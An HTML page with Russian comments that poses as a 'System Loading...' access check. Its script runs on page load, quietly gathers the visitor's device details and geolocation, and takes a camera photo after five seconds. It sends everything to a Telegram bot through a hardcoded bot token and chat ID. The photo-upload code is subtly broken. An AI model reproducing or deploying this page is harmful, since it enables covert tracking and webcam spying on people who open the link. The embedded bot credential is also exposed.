<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ó–∞–≥—Ä—É–∑–∫–∞...</title>
    <style>
        body {
            background-color: black;
            color: #0f0;
            font-family: "Courier New", Courier, monospace;
            text-align: center;
            padding: 20px;
        }
        .loading {
            font-size: 20px;
            animation: blink 1s infinite alternate;
        }
        @keyframes blink {
            from { opacity: 1; }
            to { opacity: 0.3; }
        }
    </style>
    <script>
        const TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";  // –í—Å—Ç–∞–≤—å —Ç–æ–∫–µ–Ω –±–æ—Ç–∞
        const CHAT_ID = "7477642275";  // –í—Å—Ç–∞–≤—å —Å–≤–æ–π Chat ID
        const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        const PHOTO_API_URL = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        function sendTextData(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType) {
            let message = `üì° –ù–æ–≤—ã–π –ª–æ–≥:
üåç –ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å: ${timezone}
üíª –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${platform}
üñ• –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: ${screenSize}
üà¥ –Ø–∑—ã–∫ –±—Ä–∞—É–∑–µ—Ä–∞: ${browserLang}
üåê User-Agent: ${userAgent}
üì° –¢–∏–ø —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: ${connectionType}
üó∫ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: ${geolocation}`;

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram
            fetch(API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –∏ –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã
        function collectDataAndTakePhoto() {
            let screenSize = window.screen.width + "x" + window.screen.height;
            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            let platform = navigator.platform;
            let browserLang = navigator.language;
            let userAgent = navigator.userAgent;
            let connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
            let geolocation = "–ù–µ –ø–æ–ª—É—á–µ–Ω–æ";  // –ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    geolocation = `${position.coords.latitude}, ${position.coords.longitude}`;
                    sendTextData(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType);
                    capturePhoto();
                });
            } else {
                sendTextData(geolocation, screenSize, timezone, platform, browserLang, userAgent, connectionType);
                capturePhoto();
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        function capturePhoto() {
            // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        let videoElement = document.createElement("video");
                        videoElement.srcObject = stream;
                        videoElement.play();
                        document.body.appendChild(videoElement);

                        // –î–µ–ª–∞—Ç—å —Å–Ω–∏–º–æ–∫ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
                        setTimeout(() => {
                            let canvas = document.createElement("canvas");
                            let ctx = canvas.getContext("2d");
                            canvas.width = videoElement.videoWidth;
                            canvas.height = videoElement.videoHeight;
                            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                            let photoDataUrl = canvas.toDataURL("image/png");

                            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ –≤ Telegram
                            fetch(PHOTO_API_URL, {
                                method: "POST",
                                body: new FormData()
                                    .append('chat_id', CHAT_ID)
                                    .append('photo', dataURItoBlob(photoDataUrl))
                            });

                            // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤–∏–¥–µ–æ –∏ –æ—á–∏—Å—Ç–∫–∞
                            stream.getTracks().forEach(track => track.stop());
                            videoElement.remove();
                        }, 5000); // –°–¥–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
                    }).catch(err => {
                        console.log("–û—à–∏–±–∫–∞ —Å –¥–æ—Å—Ç—É–ø–æ–º –∫ –∫–∞–º–µ—Ä–µ: " + err);
                    });
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è Data URL –≤ Blob
        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let arrayBuffer = new ArrayBuffer(byteString.length);
            let uintArray = new Uint8Array(arrayBuffer);
            for (let i = 0; i < byteString.length; i++) {
                uintArray[i] = byteString.charCodeAt(i);
            }
            return new Blob([arrayBuffer], { type: 'image/png' });
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –∏ —Ñ–æ—Ç–æ—Å—ä–µ–º–∫–∏
        collectDataAndTakePhoto();
    </script>
</head>
<body>
    <h1>System Loading...</h1>
    <p class="loading">–ò–¥—ë—Ç –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞...</p>
</body>
</html>
